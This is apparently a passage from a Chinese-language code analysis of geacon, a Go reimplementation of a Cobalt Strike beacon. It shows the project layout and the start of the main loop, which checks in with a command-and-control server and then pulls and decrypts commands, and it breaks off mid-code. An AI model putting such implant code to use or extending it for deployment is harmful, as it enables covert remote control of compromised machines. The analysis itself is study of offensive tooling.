### 0x01 写在前面
项目地址: 
项目说明:
这都说了啥...
这是一个用Golang写的弹beacon会话的工具,相对其他项目来说，这个项目算是老老实实的拟真cs通讯，正好在拿go写c2，看下逻辑学习一下。
CS相关的Golang项目可参考：
代码目录：
    ├─cmd
    │  │  main.go                             //主程序
    │  │
    │  ├─config
    │  │      c2profile.go
    │  │      config.go                       //c2配置
    │  │
    │  ├─crypt
    │  │      aes.go
    │  │      rand.go
    │  │      rsa.go
    │  │
    │  ├─packet
    │  │      commands.go
    │  │      http.go
    │  │      packet.go
    │  │
    │  ├─sysinfo
    │  │      meta.go
    │  │      sysinfo_darwin.go
    │  │      sysinfo_linux.go
    │  │      sysinfo_windows.go
    │  │
    │  └─util
    │          util.go
    │
    ├─scripts
    │      icons.cna                           //cs脚本
    │
    └─tools
        └─BeaconTool                           //Beacon RSA生成工具
### 0x02 代码分析
主程序mian.go在cmd目录下:
    package main
    import (
        "bytes"
        "fmt"
        "geacon/cmd/config"
        "geacon/cmd/crypt"
        "geacon/cmd/packet"
        "geacon/cmd/util"
        "io"
        "os"
        "time"
    )
    func main() {
        ok := packet.FirstBlood()
        if ok {
            for ; ;  {
                resp := packet.PullCommand()
                if resp != nil {
                    totalLen := resp.Response().ContentLength
                    if totalLen > 0 {
                        hmacHash := resp.Bytes()[totalLen - crypt.HmacHashLen :]
                        fmt.Printf("hmac hash: %v\n", hmacHash)
                        //TODO check the hmachash
                        restBytes := resp.Bytes()[ : totalLen - crypt.HmacHashLen]
                        decrypted := packet.DecryptPacket(restBytes)
                        timestamp := decrypted[:4]
                        fmt.Printf("timestamp: %v\n",timestamp)
                        lenBytes := decrypted[4:8]
                        packetLen := packet.ReadInt(lenBytes)
                        decryptedBuf := bytes.NewBuffer(decrypted[8:])
                        for ; ;  {
                            if packetLen 